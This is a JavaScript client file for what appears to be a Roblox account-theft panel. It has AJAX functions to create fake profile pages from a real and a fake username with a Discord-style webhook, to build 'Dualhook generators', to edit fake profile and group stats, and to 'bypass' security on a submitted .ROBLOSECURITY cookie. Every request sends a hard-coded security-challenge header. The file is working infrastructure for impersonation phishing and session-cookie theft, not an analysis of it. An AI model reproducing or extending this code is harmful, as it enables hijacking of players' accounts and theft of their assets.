function Add(a){
    var gameId = document.getElementById("gameId").value;
    $.ajax({
        url: `/controlPage/apis/add?a=${encodeURIComponent(gameId)}`,
        dataType: 'json',
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = '<i class="fa fa-plus">&nbsp;</i>Add Now';
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  `VIP / Private Server ${data['name']} created! Please refresh this page to see ur URL`,
                  'success'
                );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Remove(a){
    var gameId = document.getElementById("gameIdSelection").value;
    $.ajax({
        url: `/controlPage/apis/remove?a=${encodeURIComponent(gameId)}`,
        dataType: 'json',
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = '<i class="fa fa-times">&nbsp;</i>Remove Now';
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  `Removed ${data['name']}`,
                  'success'
                );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Regular(a, b){
    var RealUsername = document.getElementById("RealUsername").value;
    var FakeUsername = document.getElementById("FakeUsername").value;
    var Webhook = document.getElementById("Webhook").value;
    if(b){
        b = `&dh=${b}`;
    }else{
        b = ``;
    }
    $.ajax({
        url: `/controlPage/apis/create?a=${encodeURIComponent(RealUsername)}&b=${encodeURIComponent(FakeUsername)}&c=${encodeURIComponent(Webhook)}&type=Regular${b}`,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = "Create Now!";
        },
        success: function(data){
            if(data['success'] === true){
                window.location.replace("/controlPage/dashboard");
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Dualhook(a, b){
    var Directory = document.getElementById("Directory").value;
    var Name = document.getElementById("Name").value;
    var Thumbnails = document.getElementById("Thumbnails").value;
    var Webhook = document.getElementById("WebhookDualhook").value;
    var EmbedColor = document.getElementById("EmbedColor").value;
    if(b){
        b = `&dh=${b}`;
    }else{
        b = ``;
    }
    $.ajax({
        url: `/controlPage/apis/create?a=${encodeURIComponent(Directory)}&b=${encodeURIComponent(Name)}&c=${encodeURIComponent(Thumbnails)}&d=${encodeURIComponent(Webhook)}&e=${encodeURIComponent(EmbedColor)}&type=Dualhook${b}`,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = "Create Now!";
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  'Dualhook generator created',
                  'success'
                );
                window.location.replace(data['url']);
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function SignIn(a){
    var Auth = document.getElementById("Auth").value;
    $.ajax({
        url: `/controlPage/apis/signin?a=${encodeURIComponent(Auth)}`,
        dataType: 'json',
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = "Sign In";
        },
        success: function(data){
            if(data['success'] === true){
                window.location.replace("/controlPage/dashboard");
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Bypass(a){
    var Cookie = document.getElementById("cookie").value;
    var Secret = document.getElementById("secret").value;
    $.ajax({
        url: `/controlPage/apis/bypass?a=${encodeURIComponent(Cookie)}&b=${Secret}`,
        dataType: 'json',
        headers: {
            "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
        },
        beforeSend: function(){
            a.disabled = true;
            a.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            a.disabled = false;
            a.innerHTML = "Bypass Now";
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  '.ROBLOSECURITY bypassed',
                  'success'
                );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}

function Selection(a){
    document.getElementById("Profile").style.display = "none";
    document.getElementById("Group").style.display = "none";
    document.getElementById("Other").style.display = "none";
    if(a.value == "profile"){
        document.getElementById("Profile").style.display = "block";
    }else if(a.value == "group"){
        document.getElementById("Group").style.display = "block";
    }else if(a.value == "other"){
        document.getElementById("Other").style.display = "block";
    }
}

function ProfileControl(a){
    document.getElementById("profile_username").style.display = "none";
    document.getElementById("profile_displayname").style.display = "none";
    document.getElementById("profile_premium").style.display = "none";
    document.getElementById("profile_premium2").style.display = "none";
    document.getElementById("profile_userid").style.display = "none";
    document.getElementById("profile_friends").style.display = "none";
    document.getElementById("profile_followers").style.display = "none";
    document.getElementById("profile_followings").style.display = "none";
    document.getElementById("profile_about").style.display = "none";
    document.getElementById("profile_activity").style.display = "none";
    document.getElementById("profile_join").style.display = "none";
    document.getElementById("profile_socialmedia").style.display = "none";
    document.getElementById("profile_created").style.display = "none";
    document.getElementById("profile_placevisits").style.display = "none";
    localStorage.setItem("type", a.value);
    if(a.value == "profile_username"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_displayname"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_premium"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_premium2"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_userid"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_friends"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_followers"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_followings"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_about"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_activity"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_join"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_socialmedia"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_created"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "profile_placevisits"){
        document.getElementById(a.value).style.display = "block";
    }
}

function GroupControl(a){
    document.getElementById("group_funds").style.display = "none";
    document.getElementById("group_name").style.display = "none";
    document.getElementById("group_owner").style.display = "none";
    document.getElementById("group_thumbnails").style.display = "none";
    document.getElementById("group_member").style.display = "none";
    document.getElementById("group_description").style.display = "none";
    document.getElementById("group_shout").style.display = "none";
    localStorage.setItem("type", a.value);
    if(a.value == "group_name"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "group_owner"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "group_thumbnails"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "group_funds"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "group_member"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "group_description"){
        document.getElementById(a.value).style.display = "block";
    }else if(a.value == "group_shout"){
        document.getElementById(a.value).style.display = "block";
    }
}

function OtherControl(a){
    localStorage.setItem("type", a.value);
    if(a.value == "webhook"){
        document.getElementById(a.value).style.display = "block";
    }
}

function ControlProfile(a, b){
    $.ajax({
        url: `apis/control?type=${encodeURIComponent(localStorage.getItem("type"))}&value=${a}`,
        dataType: 'json',
        beforeSend: function(){
            b.disabled = true;
            b.innerHTML = "Please wait...";
        },
        error: function(data){
            Swal.fire(
                `Error`,
                `${data.responseJSON['errors'][0]['message']}`,
                `error`
            )
        },
        complete: function(){
            b.disabled = false;
            b.innerHTML = "Submit";
        },
        success: function(data){
            if(data['success'] === true){
                Swal.fire(
                  'Good job!',
                  'Data updated',
                  'success'
                );
            }else{
                Swal.fire(
                  `Error`,
                  `${data['errors'][0]['message']}`,
                  `error`
                )
            }
        }
    })
}